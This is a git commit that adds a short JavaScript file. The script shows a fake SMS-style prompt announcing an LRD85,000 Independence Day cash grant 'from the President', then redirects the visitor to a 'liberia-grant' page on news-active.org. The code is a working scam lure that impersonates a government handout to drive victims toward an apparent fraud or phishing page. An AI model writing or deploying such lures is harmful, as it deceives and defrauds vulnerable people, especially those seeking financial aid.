754782b44f633df8db0555352d0acb007eb849e1
ekpeowo <ukpehansi@gmail.com>
2025-07-11 09:43:23 +0100

    Create liberia-active.js

---
+++ liberia-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW LRD85,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive LRD85,000 Independence Day Celebration Cash Grant from the President, Press Ok to withdraw cash Now ','WITHDRAW LRD85,000');
+if (password != 'WITHDRAW LRD85,000') {
+location.href='https://news-active.org/liberia-grant.html';
+}
